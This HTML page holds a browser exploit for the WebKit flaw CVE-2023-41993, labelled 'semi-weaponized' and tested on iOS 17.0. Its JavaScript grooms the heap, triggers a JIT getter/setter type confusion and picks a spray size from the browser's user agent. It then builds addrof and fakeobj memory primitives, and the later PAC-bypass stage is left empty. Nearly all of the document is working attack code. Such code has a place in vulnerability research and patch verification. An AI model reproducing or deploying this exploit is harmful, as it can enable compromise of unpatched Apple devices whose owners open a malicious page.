
<!DOCTYPE html>
<html>
<body>
<script src="./util.js"></script>
<script src="./int64.js"></script>
<script>

document.write("<h1>Exploit for CVE-2023-41993</h1>");

/*
semi-weaponized exploit for CVE-2023-41993
tested on iOS 17.0 Beta 2 on iPhone 14 Pro Max
Author: https://github.com/0x06060606
*** DO NOT USE THIS EXPLOIT FOR MALICIOUS PURPOSES ***
*/

/*
poc: https://github.com/po6ix/POC-for-CVE-2023-41993/tree/main
poc author: @po6ix
commit: https://github.com/WebKit/WebKit/commit/08d5d17c766ffc7ca6a7c833c5720eb71b427784
advisory: https://support.apple.com/en-us/HT213926
*/

const ITERATIONS = 100000;

let boxed_arr = new Function();
boxed_arr.p1 = 1.1;
boxed_arr[0] = {};
let getter = new Function();
getter.p1 = 1.1;
getter[0] = 1.1;
let shape = {};
for (let i = 0; i < 14; ++i) {
    shape['p'+i] = i;
}
let shapes = [];
for (let i = 0; i < 0x1000; ++i) {
    shapes.push({
        ...shape,
        ['z'+i]: 0x1337
    });
}

function trigger(type) {
    let object_a = {};
    object_a.foo = 1;
    object_a.p1 = 1.1;
    let object_b = {};
    object_b.__defineGetter__('p1', getter);
    object_b.foo = 1;
    function get_getterSetter(type) {
        let o, retval;
        if (type == 0) o = object_a;
        else o = object_b;
        for (let i = 0; i < 2; ++i) {
            if (type == 0) retval = o.foo;
            else retval = o.foo;
        }
        return retval;
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    return [getter, get_getterSetter(1)];
}

(function pwn() {
    document.write("<h1> - Stage 1 - </h1>");
    for (let i = 0; i < 0x10; i++) {
        new ArrayBuffer(0x1000000)
    }
    var getter, getterSetter;
    for (let i = 1; i <= ITERATIONS; i++) {
        [getter, getterSetter] = trigger();
        try {
            getterSetter.toString();
        } catch(e) {
            break;
        }
    }
    if (getterSetter == undefined) {
        alert("Failed to trigger getterSetter!");
        location.reload();
        return;
    }
    let symbolObject = Object(getterSetter);
    let isMac = navigator.userAgent.indexOf('Macintosh;') !== -1;
    let isIphone = navigator.userAgent.indexOf('iPhone;') !== -1;
    let version = navigator.userAgent.split('Version/')[1].split(' ')[0];
    let factor;
    let unknown_device = false;
    if (isMac && version == '17.0') {
        factor = 840;
    } else if (isIphone && version == '17.0') {
        factor = 87;
    } else {
        factor = 87 + Math.floor(Math.random() * 1000);
        unknown_device = true;
    }
    document.write("<h1>Factor: " + factor + "</h1>");
    let ref_arr = [];
    for (let i = 0; i < factor; ++i) {
        ref_arr.push(symbolObject.description);
    }
    getter.p13 = 1.1;
    let unboxed_arr = getter; // Floating :)
    function addrof(o) {
        boxed_arr[8] = o;
        return Int64.fromDouble(unboxed_arr[0]);
    }
    function fakeobj(addr) {
        unboxed_arr[0] = addr.asDouble();
        return boxed_arr[8];
    }
    function isVulnerable() {
        let base = addrof({}).asDouble();
        if (!isNaN(base)) {
            let base_fake = fakeobj(Int64.fromDouble(base));
            if (base_fake.__proto__ == Object.prototype) {
                let t = {b: 42};
                let a = addrof(t);
                if (fakeobj(addrof(t)) !== t) {
                    return false;
                } else {
                    return true;
                }
            }
        }
        return false;
    }
    if (isVulnerable()) {
        document.write("<h1> - Stage 2 - </h1>");
        function FuckPAC()
        {
            try {
                // Basic v1 Prims
            } catch(e) {
                alert(e);
                location.reload();
                return;
            }
        }
        FuckPAC();
    } else {
        alert("Not vulnerable!");
        location.reload();
        return;
    }
})();

</script>
</body>
</html>